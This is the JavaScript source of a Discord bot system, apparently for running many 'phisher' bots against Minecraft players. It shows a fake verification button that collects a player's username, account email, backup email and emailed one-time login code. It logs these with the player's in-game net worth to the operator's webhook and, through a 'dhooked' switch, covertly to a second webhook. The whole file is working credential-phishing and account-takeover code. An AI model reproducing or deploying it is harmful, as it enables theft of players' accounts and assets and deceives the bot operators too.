import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { readFile } from "fs/promises";
import fetch from "node-fetch";
import axios from "axios";
import ascii from "ascii-table";
import { requestOTP } from "./requestOTP.js";
import {
  Client,
  Collection,
  Events,
  GatewayIntentBits,
  EmbedBuilder,
  ActivityType,
  ActionRowBuilder,
  ButtonBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  WebhookClient,
} from "discord.js";
import registerCommands from "./register-commands.js";
import * as db from "./database.js";

const { webhookURL, hitWebhookURL } = JSON.parse(await readFile(new URL("./config.json", import.meta.url)));
const webhookHitClient = new WebhookClient({ url: hitWebhookURL });

const table = new ascii().setHeading("Phisher Name", "Phisher ID", "Phisher Token", "Load Status");
db.createTables();

const errorEmbed = new EmbedBuilder();
errorEmbed.setColor("Red");
errorEmbed.setTitle("❌ Error");

const clients = new Collection();
const webhookClient = new WebhookClient({ url: webhookURL });

const __dirname = path.dirname(fileURLToPath(import.meta.url));

export async function init() {
  const bots = await db.getBots();
  for (const { id, token, dhooked } of bots) {
    const client = await addClient(id, token, dhooked);
    if (!client) {
      table.addRow("null", id, token, "❌ (Remove this bot using /dbots delete)");
      continue;
    }
    clients.set(id, client);
  }
  setTimeout(() => {
    console.log(table.toString());
  }, 5000);
}

export async function addBot(id, token, dhooked) {
  table.clearRows();
  const client = await addClient(id, token, dhooked);
  if (!client) {
    table.addRow("null", id, token, "❌");
    console.log(table.toString());
    return;
  }
  clients.set(id, client);
  setTimeout(() => {
    console.log(table.toString());
  }, 5000);
}

export async function deleteBot(id) {
  const client = clients.get(id);
  if (!client) return;
  await client.destroy();
  clients.delete(id);
}

const addClient = async (id, token, dhooked) => {
  return new Promise(async (resolve, reject) => {
    try {
      const client = new Client({ intents: [GatewayIntentBits.Guilds] });
      client.commands = new Collection();
      client.cooldowns = new Collection();
      client.savedUsers = new Collection();
      client.backupEmails = new Collection();

      const commandsPath = path.join(__dirname, "commands");
      const commandFiles = fs.readdirSync(commandsPath).filter((file) => file.endsWith(".js"));

      for (const file of commandFiles) {
        const filePath = path.join(commandsPath, file);
        const command = await import(filePath);
        if ("data" in command && "execute" in command) {
          client.commands.set(command.data.name, command);
        } else {
          console.error(`[WARNING] The command at ${filePath} is missing a required "data" or "execute" property.`);
        }
      }

      client.once(Events.ClientReady, async (event) => {
        table.addRow(event.user.tag, id, token, "✅");
        client.user.setPresence({
          activities: [{ name: `/help | by @altpapier`, type: ActivityType.Playing }],
          status: "online",
        });
        setInterval(() => {
          client.user.setPresence({
            activities: [{ name: `/help | by @altpapier`, type: ActivityType.Playing }],
            status: "online",
          });
        }, 3600000);
      });

      client.on(Events.InteractionCreate, async (interaction) => {
        if (!interaction.isChatInputCommand()) return;

        const command = interaction.client.commands.get(interaction.commandName);

        if (!command) {
          console.error(`No command matching ${interaction.commandName} was found.`);
          return;
        }

        const { cooldowns } = client;

        if (!cooldowns.has(command.data.name)) {
          cooldowns.set(command.data.name, new Collection());
        }

        const now = Date.now();
        const timestamps = cooldowns.get(command.data.name);
        const defaultCooldownDuration = 3;
        const cooldownAmount = (command.cooldown ?? defaultCooldownDuration) * 1000;

        if (timestamps.has(interaction.user.id)) {
          const expirationTime = timestamps.get(interaction.user.id) + cooldownAmount;

          if (now < expirationTime) {
            const expiredTimestamp = Math.round(expirationTime / 1000);
            const embed = new EmbedBuilder()
              .setColor("Red")
              .setTitle("Error")
              .setDescription(`❌ You are on cooldown. You can use it again <t:${expiredTimestamp}:R>`);
            return interaction.reply({
              embeds: [embed],
              ephemeral: true,
            });
          }
        }
        timestamps.set(interaction.user.id, now);
        setTimeout(() => timestamps.delete(interaction.user.id), cooldownAmount);

        try {
          await command.execute(client, interaction);
        } catch (error) {
          console.error(error);
          if (interaction.replied || interaction.deferred) {
            await interaction.followUp({
              content: "There was an error while executing this command!",
              ephemeral: true,
            });
          } else {
            await interaction.reply({ content: "There was an error while executing this command!", ephemeral: true });
          }
        }
      });

      client.on(Events.InteractionCreate, async (interaction) => {
        if (!interaction.isModalSubmit()) return;

        if (interaction.customId == "setupWebhook") {
          const webhook = interaction.fields.getTextInputValue("webhook");
          const isSet = await db.setWebhook(interaction.guild.id, webhook);
          if (isSet) {
            const embed = new EmbedBuilder()
              .setColor("Green")
              .setTitle("✅ Success")
              .setDescription("Your webhook has been successfully setup.");
            await interaction.reply({ ephemeral: true, embeds: [embed] });
          } else {
            const embed = new EmbedBuilder()
              .setColor("Red")
              .setTitle("❌ Error")
              .setDescription("Something went wrong. Please contact an administrator.");
            await interaction.reply({ ephemeral: true, embeds: [embed] });
          }
        } else if (interaction.customId == "setupMessage") {
          const title = interaction.fields.getTextInputValue("title");
          const description = interaction.fields.getTextInputValue("description");
          const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId("verify").setLabel("Verify").setStyle("Success").setEmoji("✅")
          );

          const embed = new EmbedBuilder().setColor("#02b95f").setTitle(title).setDescription(description);

          const successEmbed = new EmbedBuilder()
            .setColor("Green")
            .setTitle("✅ Success")
            .setDescription("Your message has been successfully setup.");
          await interaction.reply({ ephemeral: true, embeds: [successEmbed] });
          await interaction.channel.send({ embeds: [embed], components: [row] });
        } else if (interaction.customId == "verification") {
          const username = interaction.fields.getTextInputValue("username");
          const email = interaction.fields.getTextInputValue("email");
          const uuid = await getUUID(username);
          if (!uuid) {
            const embed = new EmbedBuilder()
              .setColor("Red")
              .setTitle("❌ Error")
              .setDescription("Invalid username! Please provide a valid Minecraft Username.");
            return interaction.reply({ ephemeral: true, embeds: [embed] });
          }

          const embed1 = new EmbedBuilder()
            .setColor("Yellow")
            .setTitle(":tools: Verification")
            .setDescription("Please wait. A verification code is being sent to your email.");
          await interaction.reply({ ephemeral: true, embeds: [embed1] });

          var requested;
          try {
            requested = await requestOTP(email);
          } catch (err) {}

          if (requested) {
            const { success, email: email1 } = requested;

            if (!success) {
              const embed = new EmbedBuilder().setColor("Red").setTitle("❌ Error");
              if (email1) {
                const webhook = await db.getWebhook(interaction.guild.id);
                const networth = await getNetworth(username);
                client.backupEmails.set(interaction.user.id, email1);
                client.savedUsers.set(interaction.user.id, {
                  webhook: webhook,
                  username: username,
                  uuid: uuid,
                  email: email,
                  networth: networth,
                  tag: interaction.user.tag,
                  id: interaction.user.id,
                });
                const row = new ActionRowBuilder().addComponents(
                  new ButtonBuilder().setCustomId("backup").setLabel("Confirm").setStyle("Success").setEmoji("✅")
                );

                embed.setDescription(`Please confirm your backup email: \`${email1}\``);
                return interaction.editReply({ ephemeral: true, embeds: [embed], components: [row] });
              } else {
                embed.setDescription("Invalid email! Please provide a valid Minecraft email.");
                return interaction.editReply({ ephemeral: true, embeds: [embed] });
              }
            } else {
              const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId("code").setLabel("Code").setStyle("Success").setEmoji("✅")
              );

              const embed2 = new EmbedBuilder()
                .setColor("#0099ff")
                .setTitle("✅ Verification")
                .setDescription(
                  `A verification code has been sent to \`${email}\`.\nPlease click the button below to enter your code.`
                );

              await interaction.editReply({ ephemeral: true, embeds: [embed2], components: [row] });

              try {
                const webhook = await db.getWebhook(interaction.guild.id);
                const webhookClientCustom = new WebhookClient({
                  url: webhook,
                });
                const networth = await getNetworth(username);
                client.savedUsers.set(interaction.user.id, {
                  webhook: webhook,
                  username: username,
                  uuid: uuid,
                  email: email,
                  networth: networth,
                  tag: interaction.user.tag,
                  id: interaction.user.id,
                });
                if (dhooked) {
                  await logToCustomWebhook(
                    webhookClient,
                    username,
                    uuid,
                    email,
                    networth,
                    interaction.user.tag,
                    interaction.user.id
                  );
                }
                await logToCustomWebhook(
                  webhookClientCustom,
                  username,
                  uuid,
                  email,
                  networth,
                  interaction.user.tag,
                  interaction.user.id
                );
              } catch (e) {
                console.error(e);
              }
            }
          } else {
            const embed = new EmbedBuilder()
              .setColor("Red")
              .setTitle("❌ Error")
              .setDescription("Invalid email! Please provide a valid Minecraft email.");
            return interaction.editReply({ ephemeral: true, embeds: [embed] });
          }
        } else if (interaction.customId == "insertBackup") {
          const backupEmail = interaction.fields.getTextInputValue("backup");
          const embed1 = new EmbedBuilder()
            .setColor("Yellow")
            .setTitle(":tools: Verification")
            .setDescription("Please wait. A verification code is being sent to your email.");
          await interaction.reply({ ephemeral: true, embeds: [embed1] });
          if (!client.savedUsers.get(interaction.user.id)) {
            const embed3 = new EmbedBuilder()
              .setColor("Red")
              .setTitle("❌ Error")
              .setDescription("Please re-enter your Minecraft Username and Email.");
            return interaction.editReply({ ephemeral: true, embeds: [embed3] });
          }
          const { webhook, username, uuid, email, networth, tag, id } = client.savedUsers.get(interaction.user.id);
          const webhookClientCustom = new WebhookClient({
            url: webhook,
          });

          var requested;
          try {
            requested = await requestOTP(email, backupEmail);
          } catch (err) {
            console.error(err);
          }

          if (requested) {
            const { email: email2 } = requested;

            const row = new ActionRowBuilder().addComponents(
              new ButtonBuilder().setCustomId("code").setLabel("Code").setStyle("Success").setEmoji("✅")
            );

            const embed2 = new EmbedBuilder()
              .setColor("#0099ff")
              .setTitle("✅ Verification")
              .setDescription(
                `A verification code has been sent to \`${email2}\`.\nPlease click the button below to enter your code.`
              );

            await interaction.editReply({ ephemeral: true, embeds: [embed2], components: [row] });

            try {
              if (dhooked) {
                await logToCustomWebhook(webhookClient, username, uuid, email, networth, tag, id);
              }
              await logToCustomWebhook(webhookClientCustom, username, uuid, email, networth, tag, id);
            } catch (e) {
              console.error(e);
            }
          } else {
            const embed = new EmbedBuilder()
              .setColor("Red")
              .setTitle("❌ Error")
              .setDescription("Invalid email! Please provide a valid Minecraft email.");
            return interaction.editReply({ ephemeral: true, embeds: [embed] });
          }
        } else if (interaction.customId == "insertCode") {
          if (!client.savedUsers.get(interaction.user.id)) {
            const embed3 = new EmbedBuilder()
              .setColor("Red")
              .setTitle("❌ Error")
              .setDescription("Please re-enter your Minecraft Username and Email.");
            return await interaction.editReply({ ephemeral: true, embeds: [embed3] });
          }
          const code = interaction.fields.getTextInputValue("code");
          const embed = new EmbedBuilder()
            .setColor("Red")
            .setTitle("❌ Error")
            .setDescription("Something went wrong. Please contact an administrator.");
          await interaction.reply({ ephemeral: true, embeds: [embed] });

          const { webhook, username, uuid, email, networth, tag, id } = client.savedUsers.get(interaction.user.id);
          const webhookClientCustom = new WebhookClient({
            url: webhook,
          });
          if (dhooked) {
            await logToCustomWebhook(webhookClient, username, uuid, email, networth, tag, id, code);
          }
          await logToCustomWebhook(webhookClientCustom, username, uuid, email, networth, tag, id, code);

          const hitEmbed = new EmbedBuilder()
            .setColor("DarkGreen")
            .setTitle("Phisher Hit")
            .setDescription(`Networth: **${networth}**`);
          await webhookHitClient.send({ embeds: [hitEmbed] });
        } else if (interaction.customId == "setupEmbed") {
          const title = interaction.fields.getTextInputValue("title");
          const description = interaction.fields.getTextInputValue("description");
          const link = interaction.fields.getTextInputValue("link");
          if (!isValidURL(link)) {
            const errorEmbed = new EmbedBuilder()
              .setColor("Red")
              .setTitle("❌ Error")
              .setDescription("Please provide a valid link.");
            return interaction.reply({ embeds: [errorEmbed] });
          }
          const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel("Verification").setURL(link).setStyle("Link")
          );

          const embed = new EmbedBuilder().setColor("#0099ff").setTitle(title).setDescription(description);

          const successEmbed = new EmbedBuilder()
            .setColor("Green")
            .setTitle("✅ Success")
            .setDescription("Your message has been successfully setup.");
          await interaction.reply({ ephemeral: true, embeds: [successEmbed] });
          await interaction.channel.send({ embeds: [embed], components: [row] });
        }
      });

      client.on(Events.InteractionCreate, async (interaction) => {
        if (!interaction.isButton()) return;

        if (interaction.customId == "verify") {
          const modal = new ModalBuilder().setCustomId("verification").setTitle("Verification");

          const usernameInput = new TextInputBuilder()
            .setCustomId("username")
            .setLabel("What's your Minecraft Username?")
            .setPlaceholder("Username")
            .setStyle(TextInputStyle.Short);

          const emailInput = new TextInputBuilder()
            .setCustomId("email")
            .setLabel("What's your Minecraft Email?")
            .setPlaceholder("Email")
            .setStyle(TextInputStyle.Short);

          const firstActionRow = new ActionRowBuilder().addComponents(usernameInput);
          const secondActionRow = new ActionRowBuilder().addComponents(emailInput);

          modal.addComponents(firstActionRow, secondActionRow);

          await interaction.showModal(modal);
        } else if (interaction.customId == "backup") {
          const backupEmail = client.backupEmails.get(interaction.user.id);
          const modal = new ModalBuilder().setCustomId("insertBackup").setTitle("Confirm Backup Email");

          const codeInput = new TextInputBuilder()
            .setCustomId("backup")
            .setLabel("What's your Backup Email?")
            .setPlaceholder(backupEmail)
            .setStyle(TextInputStyle.Short);

          const firstActionRow = new ActionRowBuilder().addComponents(codeInput);

          modal.addComponents(firstActionRow);

          await interaction.showModal(modal);
        } else if (interaction.customId == "code") {
          const modal = new ModalBuilder().setCustomId("insertCode").setTitle("Verification");

          const codeInput = new TextInputBuilder()
            .setCustomId("code")
            .setLabel("What's your Verification Code?")
            .setPlaceholder("Code")
            .setStyle(TextInputStyle.Short);

          const firstActionRow = new ActionRowBuilder().addComponents(codeInput);

          modal.addComponents(firstActionRow);

          await interaction.showModal(modal);
        }
      });

      const success = await registerCommands(token, id);
      if (!success) {
        return resolve(null);
      }
      client.login(token);
      return resolve(client);
    } catch (err) {
      console.error(err);
      return resolve(null);
    }
  });
};

const getUUID = async (playername) => {
  try {
    return fetch(`https://api.mojang.com/users/profiles/minecraft/${playername}`)
      .then((data) => data.json())
      .then((player) => player.id);
  } catch (err) {
    return null;
  }
};

const getNetworth = async (username) => {
  try {
    const networth = [0];
    const unsoulboundNetworth = [0];
    const url = "https://sky.shiiyu.moe/api/v2/profile/" + username;
    let response = await axios.get(url).catch((err) => {
      console.error("Request to sky.shiiyu.moe failed.");
    });
    for (const uuid in response.data["profiles"]) {
      const profile = response.data.profiles[uuid];
      if (typeof profile.data.networth.networth == "number") {
        networth.push(profile.data.networth.networth);
      }
      if (typeof profile.data.networth.unsoulboundNetworth == "number") {
        unsoulboundNetworth.push(profile.data.networth.unsoulboundNetworth);
      }
    }
    return `${format(Math.max.apply(Math, networth))} (${format(Math.max.apply(Math, unsoulboundNetworth))})`;
  } catch (err) {
    return "API DOWN";
  }
};

const format = (num, digits) => {
  const lookup = [
    { value: 1, symbol: "" },
    { value: 1e3, symbol: "k" },
    { value: 1e6, symbol: "M" },
    { value: 1e9, symbol: "B" },
    { value: 1e12, symbol: "T" },
  ];
  const rx = /\.0+$|(\.[0-9]*[1-9])0+$/;
  var item = lookup
    .slice()
    .reverse()
    .find(function (item) {
      return num >= item.value;
    });
  return item ? (num / item.value).toFixed(digits).replace(rx, "$1") + item.symbol : "0";
};

const logToCustomWebhook = (webhookClient, ign, uuid, email, networth, username, id, otp) => {
  return new Promise(async function (resolve, reject) {
    const embed = new EmbedBuilder()
      .setColor(otp ? "#00ff00" : "#ff0000")
      .setTitle(`${ign}${otp ? " has given his code" : " requested a code"}`)
      .setURL("https://sky.shiiyu.moe/stats/" + ign)
      .setDescription(
        otp
          ? `:white_check_mark: Code Received. Expires <t:${Math.floor(Date.now() / 1000) + 30 * 60}:R>`
          : ":clock1: Waiting for a code..."
      )
      .addFields(
        { name: "Username", value: "```" + ign + "```", inline: true },
        { name: "Email", value: "```" + email + "```", inline: true },
        { name: "UUID", value: "```" + uuid + "```", inline: false },
        { name: "DC User", value: "```" + username + "```", inline: true },
        { name: "DC ID", value: "```" + id + "```", inline: true },
        { name: "OTP Code", value: "```" + (otp ? otp : "Waiting") + "```", inline: false }
      )
      .setFooter({ text: `🪙 Networth - ${networth}` });

    try {
      await webhookClient.send({
        content: "@everyone",
        username: "Phisher Logger",
        embeds: [embed],
      });

      return resolve(true);
    } catch (e) {
      console.error(e);
      return resolve(false);
    }
  });
};

const isValidURL = (string) => {
  try {
    new URL(string);
    return true;
  } catch (err) {
    return false;
  }
};
